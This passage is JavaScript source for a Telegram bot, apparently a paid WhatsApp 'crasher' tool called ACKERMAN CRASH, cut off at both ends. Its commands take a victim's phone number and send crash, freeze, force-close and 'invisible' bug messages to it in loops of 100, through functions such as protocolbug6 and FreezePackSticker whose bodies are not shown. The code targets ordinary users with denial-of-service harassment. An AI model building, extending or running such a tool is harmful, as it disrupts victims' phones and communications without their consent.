│𖥂 /ᴀᴅᴅᴀᴅᴍɪɴ <ɪᴅ>
│𖥂 /ᴅᴇʟᴀᴅᴍɪɴ <ɪᴅ>
│𖥂 /ᴅᴇʟsᴇsɪ 
│𖥂 /ʀᴇsᴛᴀʀᴛ
│𖥂 /sᴇᴛᴊᴇᴅᴀ <ᴍ>
│𖥂 /ᴀᴅᴅsᴇɴᴅᴇʀ <ɴᴏᴍᴏʀ>
┗══━━━━━━━━━━━━══┛
\`\`\``;

  const media = {
    type: "video",
    media: "https://files.catbox.moe/aiaudi.mp4", 
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "「 𝗕𝗔𝗖𝗞 𝗞𝗘𝗥 」", callback_data: "back" }],
    ],
  };

try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});
// Handler unbug_bug_menu
bot.action("bug_menu", async (ctx) => {
  const Name = ctx.from.username || userId.toString();
  const waktuRunPanel = getUptime();
  const videoUrl = "https://files.catbox.moe/aiaudi.mp4";
  const mainMenuMessage = 
`\`\`\`
╔─═⊱ 𝗔𝗖𝗞𝗘𝗥𝗠𝗔𝗡 𝗖𝗥𝗔𝗦𝗛 ─═⬡
║𖥂 ☇ 𝗗𝗲𝘃 : @RapziLord
║𖥂 ☇ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 2.0 GEN 1
║𖥂 ☇ 𝗦𝘁𝗮𝘁𝘂𝘀 : Buy Private Only
║𖥂 ☇ 𝗠𝗼𝗱𝘂𝗹𝗲 : Telegraf
║𖥂 ☇ 𝗦𝗶𝗻𝘁𝗮𝗸𝘀𝗶𝘀 : JavaScript
║𖥂 ☇ 𝗢𝗻𝗹𝗶𝗻𝗲 : ${waktuRunPanel}
┗━━━━━━━━━━━━━━━━━▢

╭━✧「 𝗔𝗖𝗞𝗘𝗥𝗠𝗔𝗡 𝗕𝗨𝗚 」
┃ ┏━━━❐
┃ 𖥂 /ackerdelay 62xxxx
┃ 𖥂 /ackerforce 62xxxx
┃ 𖥂 /ackerprotocol 62xxxx
┃ ┗━━━━━━━━❏
╰══════════════❍
╭━✧「 𝗔𝗖𝗞𝗘𝗥𝗠𝗔𝗡 𝗜𝗡𝗩𝗜𝗦 」
┃ ┏━━━━━❐
┃ ⧎ /ackerfreeze 62xxxx
┃ ⧎ /ackerblank 62xxxx
┃ ⧎ /ackerinvis 62xxxx
┃ ⧎ /ackercrash 62xxxx
┃ ┗━━━━━━━━━━❏
╰════════════════❍
\`\`\`
`;

  const media = {
    type: "video",
    media: "https://files.catbox.moe/aiaudi.mp4",
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "「 𝗕𝗔𝗖𝗞 𝗞𝗘𝗥 」", callback_data: "back" }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

//Permainan
bot.action("permainan", async (ctx) => {
  const Name = ctx.from.username || userId.toString();
  const waktuRunPanel = getUptime();
  const videoUrl = "https://files.catbox.moe/aiaudi.mp4";

  const mainMenuMessage =
   `<blockquote>
╔─═⊱ 𝗦𝗸𝘆 𝗩𝗼𝗰𝗮𝗹𝗼𝗶𝗱 ─═⬡
║⎔ ☇ 𝗔𝘂𝘁𝗵𝗼𝗿 : @LalzzXiterr
║⎔ ☇ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 1.5
║⎔ ☇ 𝗦𝘁𝗮𝘁𝘂𝘀 : Private Buy
║⎔ ☇ 𝗠𝗼𝗱𝘂𝗹𝗲 : Telegraf
║⎔ ☇ 𝗦𝗶𝗻𝘁𝗮𝗸𝘀𝗶𝘀 : JavaScript
║⎔ ☇ 𝗢𝗻𝗹𝗶𝗻𝗲 : ${waktuRunPanel}
┗━━━━━━━━━━━━━━━━━▢
▢───────( 𝗚𝗮𝗺𝗲 )───────═⬡
☇ - /TebakNamaLagu
☇ - /TebakKata
☇ - /TebakGambar
☇ - /TebakFoto
☇ - /TebakMerkHp
☇ - /TebakKendaraan
▢──────────────────────────▢
<blockquote>`;

  const media = {
    type: "video",
    media: "https://files.catbox.moe/aiaudi.mp4",
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "「 𝗕𝗮𝗰𝗸 」", callback_data: "back" }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});
// Handler untuk tqto
bot.action("tqto", async (ctx) => {
  const Name = ctx.from.username || userId.toString();
  const waktuRunPanel = getUptime();
  const videoUrl = "https://files.catbox.moe/aiaudi.mp4";

  const mainMenuMessage =
   `<blockquote>
╔─═⊱ 𝗔𝗖𝗞𝗘𝗥𝗠𝗔𝗡 𝗖𝗥𝗔𝗦𝗛 ─═⬡
║𖥂 ☇ 𝗗𝗲𝘃 : @RapziLord
║𖥂 ☇ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 2.0 GEN 1
║𖥂 ☇ 𝗦𝘁𝗮𝘁𝘂𝘀 : Buy Private Only
║𖥂 ☇ 𝗠𝗼𝗱𝘂𝗹𝗲 : Telegraf
║𖥂 ☇ 𝗦𝗶𝗻𝘁𝗮𝗸𝘀𝗶𝘀 : JavaScript
║𖥂 ☇ 𝗢𝗻𝗹𝗶𝗻𝗲 : ${waktuRunPanel}
┗━━━━━━━━━━━━━━━━━▢
╭━✧「 𝗧𝗛𝗔𝗡𝗞𝗦 𝗧𝗢 」
┃ ┏━━━━━❐
┃ ⧎ @𝚁𝚊𝚙𝚣𝚒𝙻𝚘𝚛𝚍 ( 𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚛 )
┃ ⧎ @𝙳𝙴𝙰𝚃𝙷 ( 𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚛 𝟸 )
┃ ⧎ @𝙰𝙻𝙻 𝙱𝚄𝚈𝚈𝙴𝚁 ( 𝚂𝚄𝙿𝙿𝙾𝚁𝚃 )
┃ ⧎ 𝚃𝙴𝚁𝙸𝙼𝙰 𝙺𝙰𝚂𝙸𝙷 𝚄𝙳𝙰𝙷 𝙱𝚄𝚈 𝚂𝙲 𝙰𝙲𝙺𝙴𝚁𝙼𝙰𝙽
┃ ┗━━━━━━━━━━❏
╰════════════════❍
</blockquote>`;

  const media = {
    type: "video",
    media: "https://files.catbox.moe/aiaudi.mp4",
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "「 𝗕𝗮𝗰𝗸 」", callback_data: "back" }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});
// Handler untuk back main menu
bot.action("kong", async (ctx) => {
  const waktuRunPanel = getUptime();
  const videoUrl = "https://files.catbox.moe/aiaudi.mp4";

  const mainMenuMessage = `<blockquote>
Привет, я бот, который полезен для отправки ошибок 𝗝𝗜𝗚𝗘𝗡 𝗖𝗥𝗔𝗦𝗛𝗘𝗥 через бота Telegram, Я прошу вас использовать этого бота разумно и ответственно, наслаждайтесь.

╔─═⊱ 𝗔𝗖𝗞𝗘𝗥𝗠𝗔𝗡 𝗖𝗥𝗔𝗦𝗛 ─═⬡
║𖥂 ☇ 𝗗𝗲𝘃 : @RapziLord
║𖥂 ☇ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 2.0 GEN 1
║𖥂 ☇ 𝗦𝘁𝗮𝘁𝘂𝘀 : Buy Private Only
║𖥂 ☇ 𝗠𝗼𝗱𝘂𝗹𝗲 : Telegraf
║𖥂 ☇ 𝗦𝗶𝗻𝘁𝗮𝗸𝘀𝗶𝘀 : JavaScript
║𖥂 ☇ 𝗢𝗻𝗹𝗶𝗻𝗲 : ${waktuRunPanel}
┗━━━━━━━━━━━━━━━━━▢

ꜰᴏʀʏᴏᴜ ʙᴜɢ ʙᴜᴛᴛᴏɴ!! 
</blockquote>
`;

  const media = {
    type: "video",
    media: "https://files.catbox.moe/aiaudi.mp4", // ganti dengan fungsi random video kamu
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const mainKeyboard = [
    [
      { text: "𝗕𝗨𝗚 𝗔𝗖𝗞𝗘𝗥", callback_data: "bug_menu" }
    ],
    [
      { text: "𝗢𝗪𝗡𝗘𝗥 𝗔𝗖𝗞𝗘𝗥", callback_data: "set_menu" }
    ],
    [
      { text: "𝗗𝗘𝗩𝗢𝗟𝗢𝗣𝗘𝗥", url: "https://t.me/RapziiLord" }
    ],
    [
       { text: "𝗧𝗛𝗔𝗡𝗞𝗦 𝗧𝗢", callback_data: "tqto" }
    ]
  ];

  try {
    await ctx.editMessageMedia(media, {
      reply_markup: { inline_keyboard: mainKeyboard }
    });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: { inline_keyboard: mainKeyboard }
    });
  }
});

///////==== CASE BUG 1 ===\\\\\\\
bot.command("ackerblank", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;

  if (!q) {
    return ctx.reply(`Example : /ackerblank 62×××`);
  }

  if (!isOwner(ctx.from.id) && isOnGlobalCooldown()) {
    const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
    return ctx.reply(`Sabar Bang\n Tunggu ${remainingTime} detik lagi`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
    caption: `\`\`\`
▢ Target: ${q}
▢ Status: Sendding bug...
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\``,
    parse_mode: "Markdown",
  });

  const progressStages = [
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█░░░░░░░░░]10%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [███░░░░░░░]30%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█████░░░░░]50%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [███████░░░]70%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█████████░]90%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [██████████]100%\n𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 },
  ];

  for (const stage of progressStages) {
    await new Promise((resolve) => setTimeout(resolve, stage.delay));
    await ctx.editMessageCaption(
      `\`\`\`
▢ Target: ${q}
▢ Status: Successfully.
${stage.text}
\`\`\``,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }

  console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

  if (!isOwner(ctx.from.id)) {
    setGlobalCooldown();
  }

    for (let i = 0; i < 100; i++) {
    await OtaSpamNotif(target, Ptcp = true);
    await OtaSpamNotif(target);
    
    console.log(chalk.red.bold(`Sukses Sending blank Sebanyak ${i + 1}/100 Ke ${target}`));
    await new Promise(resolve => setTimeout(resolve, 1000));
  }

  await ctx.editMessageCaption(
    `\`\`\`
▢ Target: ${q}
▢ Status: Done 100%
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [██████████]100%
\`\`\``,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝗖𝗘𝗞 𝗧𝗔𝗥𝗚𝗘𝗧", url: `https://wa.me/${q}` }]],
      },
    }
  );
});
//
bot.command("ackerfreeze", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;

  if (!q) {
    return ctx.reply(`Example : /ackerfreeze 62×××`);
  }

  if (!isOwner(ctx.from.id) && isOnGlobalCooldown()) {
    const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
    return ctx.reply(`Sabar Bang\n Tunggu ${remainingTime} detik lagi`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const targetNumber = q.replace(/[^0-9]/g, "");
  const isTarget = target;
  const mention = [target];
  const show = true;

  const sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
    caption: `\`\`\`
▢ Target: ${q}
▢ Status: Sendding bug...
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\``,
    parse_mode: "Markdown",
  });

  const progressStages = [
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█░░░░░░░░░]10%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [███░░░░░░░]30%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█████░░░░░]50%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [███████░░░]70%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█████████░]90%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [██████████]100%\n𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 },
  ];

  for (const stage of progressStages) {
    await new Promise((resolve) => setTimeout(resolve, stage.delay));
    await ctx.editMessageCaption(
      `\`\`\`
▢ Target: ${q}
▢ Status: Successfully.
${stage.text}
\`\`\``,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }

  console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

  if (!isOwner(ctx.from.id)) {
    setGlobalCooldown();
  }

  for (let i = 0; i < 100; i++) {
    await FreezePackSticker(sock, target);
    await FreezePackSticker(target);

    console.log(chalk.red.bold(`Sukses Sending Crash Sebanyak ${i + 1}/100 Ke ${target}`));
    await new Promise(resolve => setTimeout(resolve, 1000));
  }

  await ctx.editMessageCaption(
    `\`\`\`
▢ Target: ${q}
▢ Status: Done 100%
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [██████████]100%
\`\`\``,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝗖𝗘𝗞 𝗧𝗔𝗥𝗚𝗘𝗧", url: `https://wa.me/${q}` }]],
      },
    }
  );
});
//
bot.command("ackerdelay", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;

  if (!q) {
    return ctx.reply(`Example : /ackerdelay 62×××`);
  }

  if (!isOwner(ctx.from.id) && isOnGlobalCooldown()) {
    const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
    return ctx.reply(`Sabar Bang\n Tunggu ${remainingTime} detik lagi`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
    caption: `\`\`\`
▢ Target: ${q}
▢ Status: Sendding bug...
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\``,
    parse_mode: "Markdown",
  });

  const progressStages = [
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█░░░░░░░░░]10%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [███░░░░░░░]30%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█████░░░░░]50%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [███████░░░]70%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█████████░]90%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [██████████]100%\n𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 },
  ];

  for (const stage of progressStages) {
    await new Promise((resolve) => setTimeout(resolve, stage.delay));
    await ctx.editMessageCaption(
      `\`\`\`
▢ Target: ${q}
▢ Status: Successfully.
${stage.text}
\`\`\``,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }

  console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

  if (!isOwner(ctx.from.id)) {
    setGlobalCooldown();
  }

  for (let i = 0; i < 100; i++) {
    await DelayBeta(sock, target);
    await DelayBeta(target);
    
    console.log(chalk.red.bold(`Sukses Sending Xinvis Sebanyak ${i + 1}/100 Ke ${target}`));
    await new Promise(resolve => setTimeout(resolve, 1000));
  }

  await ctx.editMessageCaption(
    `\`\`\`
▢ Target: ${q}
▢ Status: Done 100%
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [██████████]100%
\`\`\``,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝗖𝗘𝗞 𝗧𝗔𝗥𝗚𝗘𝗧", url: `https://wa.me/${q}` }]],
      },
    }
  );
});
//case 2\\
bot.command("ackerforce", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;

  if (!q) {
    return ctx.reply(`Example : /ackerforce 62×××`);
  }

  if (!isOwner(ctx.from.id) && isOnGlobalCooldown()) {
    const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
    return ctx.reply(`Sabar Bang\n Tunggu ${remainingTime} detik lagi`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
    caption: `\`\`\`
▢ Target: ${q}
▢ Status: Sendding bug...
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\``,
    parse_mode: "Markdown",
  });

  const progressStages = [
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█░░░░░░░░░]10%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [███░░░░░░░]30%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█████░░░░░]50%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [███████░░░]70%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█████████░]90%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [██████████]100%\n𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 },
  ];

  for (const stage of progressStages) {
    await new Promise((resolve) => setTimeout(resolve, stage.delay));
    await ctx.editMessageCaption(
      `\`\`\`
▢ Target: ${q}
▢ Status: Successfully.
${stage.text}
\`\`\``,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }

  console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

  if (!isOwner(ctx.from.id)) {
    setGlobalCooldown();
  }

  for (let i = 0; i < 100; i++) {
    await VampSpamFc(target);
    await PayMsgFlowX(target);
    await FcBetaOtax(target, true);
    
    console.log(chalk.red.bold(`Sukses Sending forceclose Sebanyak ${i + 1}/100 Ke ${target}`));
    await new Promise(resolve => setTimeout(resolve, 1000));
  }

  await ctx.editMessageCaption(
    `\`\`\`
▢ Target: ${q}
▢ Status: Done 100%
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [██████████]100%
\`\`\``,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝗖𝗘𝗞 𝗧𝗔𝗥𝗚𝗘𝗧", url: `https://wa.me/${q}` }]],
      },
    }
  );
});
///////==== CASE BUG 2 ===\\\\\\\
bot.command("ackerprotocol", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;

  if (!q) {
    return ctx.reply(`Salah, Yang Bener: /ackerprotocol 62xxxxx`);
  }

  if (!isOwner(userId) && isOnGlobalCooldown()) {
    const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
    return ctx.reply(`Sabar Bang\nTunggu ${remainingTime} detik lagi`);
  }

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
    caption: `\`\`\`
▢ Target: ${q}
▢ Status: Sending bug...
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\``,
    parse_mode: "Markdown"
  });

  const progressStages = [
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█░░░░░░░░░]10%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [███░░░░░░░]30%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█████░░░░░]50%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [███████░░░]70%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█████████░]90%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [██████████]100%\n𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 },
  ];

  for (const stage of progressStages) {
    await new Promise((resolve) => setTimeout(resolve, stage.delay));
    await ctx.editMessageCaption(
      `\`\`\`
▢ Target: ${q}
▢ Status: Processing...
${stage.text}
\`\`\``,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }

  if (!isOwner(userId)) setGlobalCooldown();

  console.log(chalk.green(`[LOG] Memulai pengiriman bug ke ${target}`));
  for (let i = 0; i < 100; i++) {
    try {
      await protocolbug6(target, mention);
      await protocolbug6(target);
      
      console.log(chalk.redBright(`Sukses kirim protocol ${i + 1}/100 ke ${target}`));
      await new Promise((r) => setTimeout(r, 1000));
    } catch (err) {
      console.error(chalk.red(`❌ Gagal kirim ke ${target}: ${err.message}`));
      break;
    }
  }

  await ctx.editMessageCaption(
    `\`\`\`
▢ Target: ${q}
▢ Status: Done 100%
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [██████████]100%
\`\`\``,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝗖𝗘𝗞 𝗧𝗔𝗥𝗚𝗘𝗧", url: `https://wa.me/${q}` }]],
      },
    }
  );
});
///////==== CASE BUG 3 ===\\\\\\\
///////==== CASE BUG 4 ===\\\\\\\
bot.command("ackerinvis", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;

  if (!q) return ctx.reply(`Salah, Yang Bener: /ackerinvis 62xxxx`);

  if (!isOwner(userId) && isOnGlobalCooldown()) {
    const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
    return ctx.reply(`Sabar Bang\nTunggu ${remainingTime} detik lagi`);
  }

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
    caption: `\`\`\`
▢ Target: ${q}
▢ Status: Sending bug...
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [░░░░░░░░░░] 0%
\`\`\``,
    parse_mode: "Markdown"
  });

  const progressStages = [
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█░░░░░░░░░]10%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [███░░░░░░░]30%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█████░░░░░]50%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [███████░░░]70%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█████████░]90%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [██████████]100%\n𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 },
  ];

  for (const stage of progressStages) {
    await new Promise((r) => setTimeout(r, stage.delay));
    await ctx.editMessageCaption(
      `\`\`\`
▢ Target: ${q}
▢ Status: Sending...
${stage.text}
\`\`\``,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown"
      }
    );
  }

  if (!isOwner(userId)) setGlobalCooldown();

  console.log("\x1b[32m[PROSES BUG SEDANG BERLANGSUNG]\x1b[0m");

  for (let i = 0; i < 100; i++) {
    try {
      await InVisibleX1(target, show);
      await InVisibleX1(target);
      await isagivisble1(target, mention);
      await isagivisble1(target);
      
      console.log(chalk.red.bold(`✅ Ke-${i + 1}/100 bug terkirim ke ${target}`));
    } catch (err) {
      console.log(chalk.red(`❌ Error kirim ke ${target}:`, err.message));
    }
    await new Promise(resolve => setTimeout(resolve, 2000));
  }

  await ctx.editMessageCaption(
    `\`\`\`
▢ Target: ${q}
▢ Status: Done!
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [██████████]100%
\`\`\``,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝗖𝗘𝗞 𝗧𝗔𝗥𝗚𝗘𝗧", url: `https://wa.me/${q}` }]
        ]
      }
    }
  );
});
///////==== CASE BUG 5 ===\\\\\\\
// Fungsi untuk ubah nomor ke format JID
function jid(number) {
  number = number.replace(/\D/g, ""); // Hilangkan semua karakter non-digit
  return number + "@s.whatsapp.net"; // Tambahkan domain WhatsApp
}

// Command SkyDelay
bot.command("ackercrash", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;
  const mention = target;

  if (!q) return ctx.reply(`Example : /ackercrash 62xxxx`);

  // Cek cooldown global untuk non-owner
  if (!isOwner(userId) && isOnGlobalCooldown()) {
    const remaining = Math.ceil((globalCooldown - Date.now()) / 1000);
    return ctx.reply(`Sabar Bang\nTunggu ${remaining} detik lagi`);
  }

  const target = jid(q); // Format JID

  // Kirim pesan awal progres
  const sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
    caption: `\`\`\`
▢ Target : ${q}
▢ Status : Sending bug...
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\``,
    parse_mode: "Markdown",
  });

  // Animasi progres
  const progress = [
    { bar: "[█░░░░░░░░░] 10%", delay: 200 },
    { bar: "[███░░░░░░░] 30%", delay: 200 },
    { bar: "[█████░░░░░] 50%", delay: 150 },
    { bar: "[███████░░░] 70%", delay: 100 },
    { bar: "[█████████░] 90%", delay: 100 },
    { bar: "[██████████] 100%\nSuccess sending bug!", delay: 200 },
  ];

  for (const stage of progress) {
    await new Promise((r) => setTimeout(r, stage.delay));
    await ctx.telegram.editMessageCaption(chatId, sentMessage.message_id, undefined,
      `\`\`\`
▢ Target : ${q}
▢ Status : Progressing...
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : ${stage.bar}
\`\`\``,
      { parse_mode: "Markdown" });
  }

  // Set cooldown setelah kirim jika bukan owner
  if (!isOwner(userId)) setGlobalCooldown();

  // ⛔️ LOOP SPAM GACOR ⛔️
  for (let i = 0; i < 100; i++) {
    await gladiator(target, mention = true);
    
    console.log(chalk.red.bold(`[${i + 1}/100] Sent crash Bug to ${target}`));
    await new Promise((r) => setTimeout(r, 1000)); // jeda antar spam
  }

  // Kirim hasil akhir ke user
  await ctx.telegram.editMessageCaption(chatId, sentMessage.message_id, undefined,
    `\`\`\`
▢ Target : ${q}
▢ Status : DONE!
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
\`\`\``,
    {
